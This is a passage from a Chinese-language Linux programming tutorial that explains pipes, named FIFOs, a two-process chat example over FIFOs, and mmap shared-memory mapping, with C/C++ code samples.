class="number">0</span>,SIZE);</span><br><span class="line">        <span class="comment">//读取管道内容</span></span><br><span class="line">        ret = <span class="built_in">read</span>(fds[<span class="number">0</span>],buf,SIZE);</span><br><span class="line">        <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">perror</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child process buf:%s\n&quot;</span>,buf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//关闭读端</span></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">0</span>]);</span><br><span class="line">        <span class="comment">//进程退出</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//父进程</span></span><br><span class="line">    <span class="comment">//关闭读端</span></span><br><span class="line">    <span class="built_in">close</span>(fds[<span class="number">0</span>]);</span><br><span class="line">    ret = <span class="built_in">write</span>(fds[<span class="number">1</span>],<span class="string">&quot;ABCDEFGHIJK&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;parent process write len:%d&quot;</span>,ret);</span><br><span class="line">    <span class="comment">//关闭写端</span></span><br><span class="line">    <span class="built_in">close</span>(fds[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">test01</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2024/03/13/Linux/1686319537542-eada4555-a12d-4216-9c94-6cb7ae683760.png" alt="image.png"></p><p><img src="/2024/03/13/Linux/1686319584721-464e8db4-63f2-453d-aea1-df22fe22c93c.png" alt="image.png"></p><p><img src="/2024/03/13/Linux/1686319740575-fbecd13e-7281-40f1-9287-a873ed005a2a.png" alt="image.png"></p><p>**查看管道缓冲区的大小 **<strong>ulimit -a</strong><br><strong>查看管道缓冲区的函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">fpathconf</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> name)</span></span>;</span><br><span class="line">功能：该函数可以通过name参数查看不同的属性值</span><br><span class="line">参数：</span><br><span class="line">     fd:文件描述符</span><br><span class="line">     name:</span><br><span class="line">         _PC_PIPE_BUF,查看管道缓冲区的大小</span><br><span class="line">         _PC_NAME_MAX，文件名字字节数的上限</span><br><span class="line">返回值：</span><br><span class="line">      成功：根据name返回的值的意义也不同</span><br><span class="line">      失败：<span class="number">-1</span></span><br></pre></td></tr></table></figure><p><strong>有名管道的创建</strong><br><strong>管道，由于没有名字，只能用于亲缘关系的进程间通信。为了克服这个缺点，提出了命名管道(FIFO),也叫有名管道。</strong><br>** 命名管道和无名管道区别：**<br><strong>1）FIFO在文件系统中作为一个特殊的存在，但FIFO中的内容却放在内存中</strong><br><strong>2）当时用FIFO的进程退出后，FIFO文件将继续保存在文件系统中以便以后使用</strong><br><strong>3）FIFO有名字，不相关的进程可以通过打开命名管道进行通信</strong><br><strong>​</strong><br><strong>通过命令创建有名管道</strong><br><strong>mkfifo  管道名</strong><br><strong>​</strong><br><strong>通过函数创建有名管道</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">mkfifo</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname,<span class="type">mode_t</span> mode)</span></span>;</span><br><span class="line"></span><br><span class="line">参数：pathname :普通的路径名，也就是创建后FIFO的名字</span><br><span class="line">      mode : 文件权限，与打开普通文件的<span class="built_in">open</span>()函数中的mode参数相同</span><br><span class="line"></span><br><span class="line">返回值：</span><br><span class="line">      成功：<span class="number">0</span></span><br><span class="line">      失败：如果文件已经存在，则会出错且返回 <span class="number">-1</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure><p><strong>查看管道文件是否存在</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">access</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname,<span class="type">int</span> mode)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>有名管道读写操作</strong><br><strong>一旦使用mkfifo创建一个FIFO，就可以使用open打开它，常见的文件I&#x2F;O函数都可以用于fifo，如close，read，write，unlink等</strong><br><strong>FIFO严格遵循<strong><strong>先进先出，</strong></strong>对管道及FIFO的读总是从开始处返回数据，对他们的写则是把数据添加到末尾，****他们不支持Iseek()等文件定位操作</strong><br>写管道</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;unistd.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sys/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sys/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;fcntl.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  SIZE 128</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">test03</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[SIZE];</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> fd =<span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//写有名管道</span></span><br><span class="line">    <span class="comment">//1.以只写的方式打开一个管道文件</span></span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">&quot;fifo&quot;</span>,O_WRONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;以只写方式打开有个有名管道&quot;</span>);</span><br><span class="line">    <span class="comment">//2.写管道</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,SIZE);</span><br><span class="line">        <span class="built_in">sprintf</span>(buf,<span class="string">&quot;hello world %d&quot;</span>,i++);</span><br><span class="line">        ret = <span class="built_in">write</span>(fd,buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">perror</span>(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;write into fifo:%d\n&quot;</span>,ret);</span><br><span class="line">        <span class="built_in">sleep</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//3.关闭文件</span></span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读管道</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;unistd.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sys/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sys/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;fcntl.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  SIZE 128</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">test04</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="type">char</span> buf[SIZE];</span><br><span class="line">    <span class="type">int</span> fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//读管道</span></span><br><span class="line">    <span class="comment">//1.以只读方式打开一个管道文件</span></span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">&quot;fifo&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;以只读方式打开一个管道文件&quot;</span>);</span><br><span class="line">    <span class="comment">//2.循环读取管道文件内容</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,SIZE);</span><br><span class="line">        ret = <span class="built_in">read</span>(fd,buf,SIZE);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">perror</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;管道内容%s&quot;</span>,buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//关闭文件</span></span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>​</strong><br><strong>使用有名管道实现建议聊天窗口</strong><br><strong>使用两个管道fifo1,fifo2      fgets(buf,SIZE,stdin)</strong><br><strong>两个程序talkA : 先写后读   写fifo1 读fifo2</strong><br>**            talkB:  先读后写   读fifo1 写fifo2**<br>talkA.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;unistd.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sys/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sys/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;fcntl.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  SIZE 128</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">//先写后读</span></span><br><span class="line">    <span class="type">char</span> buf[SIZE];</span><br><span class="line">    <span class="type">int</span> fdr = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> fdw = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">     <span class="comment">//以只写方式打开管道1</span></span><br><span class="line">    fdw = <span class="built_in">open</span>(<span class="string">&quot;fifo1&quot;</span>,O_WRONLY);</span><br><span class="line">    <span class="keyword">if</span>(fdw == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;fifo1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;以只写方式打开管道1&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//以只读方式打开管道2</span></span><br><span class="line">    fdr = <span class="built_in">open</span>(<span class="string">&quot;fifo2&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fdr == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;fifo2&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;以只读方式打开管道2&quot;</span>);</span><br><span class="line">    <span class="comment">//管道2进行读操作</span></span><br><span class="line">    <span class="comment">//管道1进行写操作</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;   <span class="built_in">memset</span>(buf,<span class="number">0</span>,SIZE);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;发消息：&quot;</span>);</span><br><span class="line">        <span class="built_in">fgets</span>(buf,SIZE,stdin);</span><br><span class="line">        <span class="keyword">if</span>(buf[<span class="built_in">strlen</span>(buf)<span class="number">-1</span>] == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            buf[<span class="built_in">strlen</span>(buf)<span class="number">-1</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = <span class="built_in">write</span>(fdw,buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">        <span class="keyword">if</span>(ret &lt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">perror</span>(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;向fifo1中写入字节数：%d\n&quot;</span>,ret);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,SIZE);</span><br><span class="line">        ret = <span class="built_in">read</span>(fdr,buf,SIZE);</span><br><span class="line">        <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">perror</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fifo2读取的内容为:%s\n&quot;</span>,buf);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//关闭管道1，2</span></span><br><span class="line">    <span class="built_in">close</span>(fdr);</span><br><span class="line">    <span class="built_in">close</span>(fdw);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p> talkB.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sys/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sys/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;fcntl.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  SIZE 128</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[SIZE];</span><br><span class="line">    <span class="comment">//先读后写</span></span><br><span class="line">    <span class="type">int</span> fdr = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> fdw = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//以只读方式打开管道1</span></span><br><span class="line">    fdr = <span class="built_in">open</span>(<span class="string">&quot;fifo1&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fdr == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;fifo1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;以只读方式打开管道1&quot;</span>);</span><br><span class="line">    <span class="comment">//以只写方式打开管道2</span></span><br><span class="line">    fdw = <span class="built_in">open</span>(<span class="string">&quot;fifo2&quot;</span>,O_WRONLY);</span><br><span class="line">    <span class="keyword">if</span>(fdw == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;fifo2&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;以只写方式打开管道2&quot;</span>);</span><br><span class="line">    <span class="comment">//管道1进行读操作</span></span><br><span class="line">    <span class="comment">//管道2进行写操作</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,SIZE);</span><br><span class="line">        ret = <span class="built_in">read</span>(fdr,buf,SIZE);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">perror</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fifo1读取的内容为:%s\n&quot;</span>,buf);</span><br><span class="line"></span><br><span class="line">       <span class="built_in">memset</span>(buf,<span class="number">0</span>,SIZE);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;发消息：&quot;</span>);</span><br><span class="line">        <span class="built_in">fgets</span>(buf,SIZE,stdin);</span><br><span class="line">        <span class="keyword">if</span>(buf[<span class="built_in">strlen</span>(buf)<span class="number">-1</span>] == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            buf[<span class="built_in">strlen</span>(buf)<span class="number">-1</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = <span class="built_in">write</span>(fdw,buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">        <span class="keyword">if</span>(ret &lt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">perror</span>(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;向fifo2中写入字节数：%d\n&quot;</span>,ret);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//关闭管道1，2</span></span><br><span class="line">    <span class="built_in">close</span>(fdr);</span><br><span class="line">    <span class="built_in">close</span>(fdw);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>共享存储映射</strong><br><strong>存储映射I&#x2F;O使用一个磁盘文件与存储空间中的一个缓冲区相映射</strong><br><img src="/2024/03/13/Linux/1686380692097-6fc1f75b-ce0e-47c4-b654-63cfd02097ca.png" alt="image.png"></p><p>于是当从缓冲区中读取数据，就相当于读文件中的相应字节。类似，将数据存入缓冲区，则相应的字节就自动写入文件，这样，就可以在不适用read和write函数的情况下，使用地址(指针)完成I&#x2F;O操作<br>​<br>共性内存可以说是最有用的进程间通信方式，也是最快的IPC形式，因为进程可以直接读写内存，而不需要任何数据的拷贝<br>​<br><strong>存储映射函数</strong><br><strong>（1）mmap函数</strong><br><img src="/2024/03/13/Linux/1686381061096-dc2b2dcb-8f5a-452b-9d59-fc647ca77dc1.png" alt="image.png"></p><p><strong>munmap函数(断开映射区的连接)</strong><br><img src="/2024/03/13/Linux/1686382469931-77175205-4449-4f9e-b66c-4b861e06113f.png" alt="image.png"></p><p>使用mmap函数<br><img src="/2024/03/13/Linux/1686382328704-c36b46ca-b3cc-4fb0-818b-87c1fded6ddf.png" alt="image.png"></p><p><strong>映射区的注意事项:</strong><br><strong>1.创建映射区的过程中，隐含着一次对映射文件的读取</strong><br><strong>2.当MAP_SHARED时，要求：映射区的权限应&lt;&#x3D;文件打开的权限（出于对映射区的保护）。而MAP_PRIVATE则无所谓，因为mmap中的权限是对内存的限制。</strong><br><strong>3.映射区的释放与文件关闭无关，只要映射创立成功，文件可以立即关闭</strong><br><strong>4.特别注意，当映射文件大小为0时，不能创建映射区，所以，用于映射的文件必须要有实际大小，mmap使用常常会出现错误，通常是由于共享文件存储空间大小引起的</strong><br><strong>5.munmap传入的地址一定是mmap的返回地址，坚决杜绝指针++操作</strong><br><strong>6.如果文件偏移量，必须是4k的整数倍</strong><br><strong>7.mmap创建映射区出错率非常高，一定要检查返回值，确保映射区建立成功后再进行后续操作</strong><br><strong>​</strong><br><strong>父子进程借助存储映射区实现通信</strong><br><img src="/2024/03/13/Linux/1686574291798-f2a8c9ec-cd7e-492b-ad47-e912bb95173c.png" alt="image.png"></p><p><strong>不同进程使用存储映射区进行通信</strong><br><strong>原理一样，借助存储映射实现进程通信</strong><br><strong>​</strong><br><strong>匿名映射实现<strong><strong>父子</strong></strong>进程通信</strong><br>通过使用我们发现，使用映射区来完成文件读写操作十分方便，父子进程通信也比较容易，但缺陷是，每次创建映射区一定要依赖一个文件才能实现。<br>通常为了建立映射区要open一个temp文件，创建好了再unlink,close掉，比较麻烦，可以直接使用匿名映射来代替。<br>其实linux系统给我们提供了创建匿名映射区的方法，无需依赖一个文件即可创建映射区，同样需要借助标志位参数flag来指定<br>​<br><strong>使用MAP_ANONYMOUS(或MAP_ANON)</strong><br>*<em>int <em>p &#x3D; mmap(NULL,4,PORT_READ | PORT_WRITE, MAP_SHARED | <strong><strong>MAP_ANONYMOUS</strong></strong> , -1,0);</em></em></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 